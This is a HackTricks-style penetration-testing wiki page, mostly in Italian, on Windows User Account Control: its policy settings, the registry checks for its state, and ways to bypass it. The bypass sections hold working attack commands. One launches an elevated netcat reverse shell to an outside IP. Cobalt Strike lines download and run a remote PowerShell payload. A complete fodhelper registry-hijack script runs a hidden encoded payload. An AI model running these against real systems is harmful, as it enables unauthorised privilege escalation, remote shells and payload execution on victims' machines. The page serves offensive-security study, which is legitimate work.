# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) è una funzionalità che abilita un **prompt di consenso per attività elevate**. Le applicazioni hanno diversi livelli di `integrity`, e un programma con un **livello elevato** può eseguire operazioni che **potrebbero potenzialmente compromettere il sistema**. Quando UAC è abilitato, le applicazioni e i task vengono sempre **eseguiti nel contesto di sicurezza di un account non amministratore** a meno che un amministratore non autorizzi esplicitamente tali applicazioni/task ad avere accesso di livello amministratore per l'esecuzione. È una funzionalità di comodità che protegge gli amministratori da modifiche involontarie ma non è considerata un confine di sicurezza.

Per maggiori informazioni sui livelli di integrità:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Quando UAC è attivo, un utente amministratore riceve 2 token: uno come utente standard, per compiere azioni ordinarie a livello normale, e uno con i privilegi di amministratore.

Questa [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) descrive in dettaglio come funziona UAC e include il processo di logon, l'esperienza utente e l'architettura di UAC. Gli amministratori possono utilizzare criteri di sicurezza per configurare come UAC funzioni specificamente per la loro organizzazione a livello locale (usando secpol.msc), o configurato e distribuito tramite Group Policy Objects (GPO) in un ambiente di dominio Active Directory. Le varie impostazioni sono discusse in dettaglio [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Ci sono 10 impostazioni di Group Policy che possono essere configurate per UAC. La tabella seguente fornisce ulteriori dettagli:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Chiave del registro         | Impostazione predefinita                                      |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Disabilitato                                                 |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Disabilitato                                                 |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Prompt for consent for non-Windows binaries                  |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Prompt for credentials on the secure desktop                 |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Abilitato (predefinito per home) Disabilitato (predefinito per enterprise) |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Disabilitato                                                 |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Abilitato                                                    |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Abilitato                                                    |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Abilitato                                                    |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Abilitato                                                    |

### Teoria del bypass UAC

Alcuni programmi sono **autoelevated automatically** se l'**utente appartiene** al **gruppo amministratori**. Questi binari hanno nei loro _**Manifests**_ l'opzione _**autoElevate**_ con valore _**True**_. Il binario deve inoltre essere **signed by Microsoft**.

Molti processi auto-elevanti espongono **funzionalità via COM objects or RPC servers**, che possono essere invocate da processi in esecuzione con integrità medio (privilegi a livello utente regolare). Nota che COM (Component Object Model) e RPC (Remote Procedure Call) sono metodi che i programmi Windows utilizzano per comunicare ed eseguire funzioni tra processi differenti. Per esempio, **`IFileOperation COM object`** è progettato per gestire operazioni sui file (copia, cancellazione, spostamento) e può elevare automaticamente i privilegi senza un prompt.

Nota che potrebbero essere effettuati alcuni controlli, come verificare se il processo è stato eseguito dalla **System32 directory**, che può essere bypassato ad esempio **injecting into explorer.exe** o un altro eseguibile situato in System32.

Un altro modo per bypassare questi controlli è **modificare la PEB**. Ogni processo in Windows ha una Process Environment Block (PEB), che include dati importanti sul processo, come il percorso dell'eseguibile. Modificando la PEB, un attaccante può falsificare (spoof) la posizione del proprio processo maligno, facendolo apparire come eseguito da una directory attendibile (come system32). Queste informazioni falsate ingannano il COM object inducendolo ad auto-elevare i privilegi senza chiedere all'utente.

Quindi, per **bypassare** la **UAC** (elevare da **livello medio** di integrità **a livello elevato**) alcuni attaccanti usano questo tipo di binari per **eseguire codice arbitrario** poiché verrà eseguito da un processo con **High level integrity**.

Puoi **controllare** il _**Manifest**_ di un binario usando lo strumento _**sigcheck.exe**_ di Sysinternals. (`sigcheck.exe -m <file>`) E puoi **vedere** il **livello di integrità** dei processi usando _Process Explorer_ o _Process Monitor_ (di Sysinternals).

### Verificare UAC

Per confermare se UAC è abilitato, esegui:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Se è **`1`** allora UAC è **attivato**, se è **`0`** o non esiste, allora UAC è **disattivato**.

Quindi, verifica **quale livello** è configurato:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- If **`0`** then, UAC won't prompt (like **disabled**)
- If **`1`** the admin is **asked for username and password** to execute the binary with high rights (on Secure Desktop)
- If **`2`** (**Always notify me**) UAC will always ask for confirmation to the administrator when he tries to execute something with high privileges (on Secure Desktop)
- If **`3`** like `1` but not necessary on Secure Desktop
- If **`4`** like `2` but not necessary on Secure Desktop
- if **`5`**(**default**) it will ask the administrator to confirm to run non Windows binaries with high privileges

Then, you have to take a look at the value of **`LocalAccountTokenFilterPolicy`**\
If the value is **`0`**, then, only the **RID 500** user (**built-in Administrator**) is able to perform **admin tasks without UAC**, and if its `1`, **all accounts inside "Administrators"** group can do them.

And, finally take a look at the value of the key **`FilterAdministratorToken`**\
If **`0`**(default), the **built-in Administrator account can** do remote administration tasks and if **`1`** the built-in account Administrator **cannot** do remote administration tasks, unless `LocalAccountTokenFilterPolicy` is set to `1`.

#### Riepilogo

- If `EnableLUA=0` or **doesn't exist**, **no UAC for anyone**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=1` , No UAC for anyone**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=0`, No UAC for RID 500 (Built-in Administrator)**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=1`, UAC for everyone**

All this information can be gathered using the **metasploit** module: `post/windows/gather/win_privs`

Puoi anche controllare i gruppi del tuo utente e ottenere il livello di integrità:
```
net user %username%
whoami /groups | findstr Level
```
## UAC bypass

> [!TIP]
> Nota che se hai accesso grafico alla vittima, il bypass di UAC è semplice poiché puoi semplicemente cliccare su "Yes" quando appare il prompt UAC

Il bypass di UAC è necessario nella seguente situazione: **UAC è attivato, il tuo processo è in un contesto di medium integrity, e il tuo utente appartiene al gruppo Administrators**.

È importante menzionare che è **molto più difficile bypassare UAC se è impostato al livello di sicurezza più alto (Always) rispetto a qualsiasi altro livello (Default).**

### UAC disabilitato

Se UAC è già disabilitato (`ConsentPromptBehaviorAdmin` è **`0`**) puoi **execute a reverse shell with admin privileges** (high integrity level) usando qualcosa come:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Molto** semplice UAC "bypass" (accesso completo al file system)

Se hai una shell con un utente che fa parte del gruppo Administrators puoi **mount the C$** shared via SMB (file system) local in a new disk e avrai **accesso a tutto il file system** (anche la cartella home di Administrator).

> [!WARNING]
> **Sembra che questo trucco non funzioni più**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass with cobalt strike

Le tecniche di Cobalt Strike funzioneranno solo se UAC non è impostato al suo livello di sicurezza massimo.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** e **Metasploit** hanno anche diversi moduli per **bypass** della **UAC**.

### KRBUACBypass

Documentazione e tool in [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME) che è una **compilazione** di diversi UAC bypass exploits. Nota che dovrai **compilare UACME usando visual studio o msbuild**. La compilazione creerà diversi eseguibili (come `Source\Akagi\outout\x64\Debug\Akagi.exe`) , dovrai sapere **quale ti serve.**\
Dovresti **fare attenzione** perché alcuni **bypass** faranno **apparire dei prompt in altri programmi** che **avviseranno** l'**utente** che qualcosa sta succedendo.

UACME riporta la **build da cui ogni tecnica ha iniziato a funzionare**. Puoi cercare una tecnica che interessi le tue versioni:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Also, using [this](https://en.wikipedia.org/wiki/Windows_10_version_history) page you get the Windows release `1607` from the build versions.

### UAC Bypass – fodhelper.exe (Registry hijack)

Il binario affidabile `fodhelper.exe` viene elevato automaticamente su Windows moderni. Quando viene avviato, interroga il percorso del registro per utente qui sotto senza validare il verbo `DelegateExecute`. Posizionare un comando in quel percorso permette a un processo con Medium Integrity (l'utente è membro del gruppo Administrators) di avviare un processo con High Integrity senza visualizzare il prompt UAC.

Registry path queried by fodhelper:
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
Passaggi PowerShell (imposta il tuo payload, poi trigger):
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
Note:
- Funziona quando l'utente corrente è membro degli Administrators e il livello UAC è default/lenient (non Always Notify con restrizioni extra).
- Usa il percorso `sysnative` per avviare una PowerShell a 64-bit da un processo a 32-bit su Windows a 64-bit.
- Il payload può essere qualsiasi comando (PowerShell, cmd, o un percorso EXE). Evitare UI che richiedono prompt per mantenere lo stealth.

#### Altri bypass UAC

**All** the techniques used here to bypass AUC **require** a **full interactive shell** with the victim (a common nc.exe shell is not enough).

Puoi ottenerla usando una sessione **meterpreter**. Migra in un **process** che ha il valore **Session** uguale a **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ dovrebbe funzionare)

### Bypass UAC con GUI

Se hai accesso a una **GUI puoi semplicemente accettare il prompt UAC** quando compare, non hai veramente bisogno di un bypass. Quindi, ottenere accesso a una GUI ti permetterà di bypassare il UAC.

Inoltre, se ottieni una sessione GUI che qualcuno stava usando (potenzialmente via RDP) ci sono **alcuni tool che verranno eseguiti come administrator** da cui potresti **eseguire** ad esempio un **cmd** **come admin** direttamente senza essere nuovamente richiesto da UAC, come [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Questo potrebbe essere un po' più **stealthy**.

### Bypass UAC rumoroso (brute-force)

Se non ti importa di essere rumoroso puoi sempre **eseguire qualcosa come** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) che **chiede di elevare i permessi finché l'utente non li accetta**.

### Il tuo bypass - metodologia di base per bypass UAC

Se dai un'occhiata a **UACME** noterai che **la maggior parte dei bypass UAC sfrutta una vulnerabilità di Dll Hijacking** (principalmente scrivendo la dll malevola in _C:\Windows\System32_). [Leggi questo per imparare come trovare una vulnerabilità di Dll Hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Trova un binary che **autoelevate** (verifica che quando viene eseguito funzioni a livello di integrità elevato).
2. Con procmon trova eventi "**NAME NOT FOUND**" che possono essere vulnerabili a **DLL Hijacking**.
3. Probabilmente dovrai **scrivere** la DLL all'interno di alcuni **percorsi protetti** (come C:\Windows\System32) dove non hai permessi di scrittura. Puoi bypassare questo usando:
   1. **wusa.exe**: Windows 7,8 e 8.1. Permette di estrarre il contenuto di un file CAB all'interno di percorsi protetti (perché questo tool viene eseguito a high integrity level).
   2. **IFileOperation**: Windows 10.
4. Prepara uno **script** per copiare la tua DLL nel percorso protetto ed eseguire il binary vulnerabile e autoelevated.

### Un'altra tecnica di bypass UAC

Consiste nel verificare se un **autoElevated binary** tenta di **leggere** dal **registry** il **nome/percorso** di un **binary** o **comando** da **eseguire** (questo è più interessante se il binary cerca queste informazioni dentro la **HKCU**).

## Riferimenti
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)

{{#include ../../banners/hacktricks-training.md}}
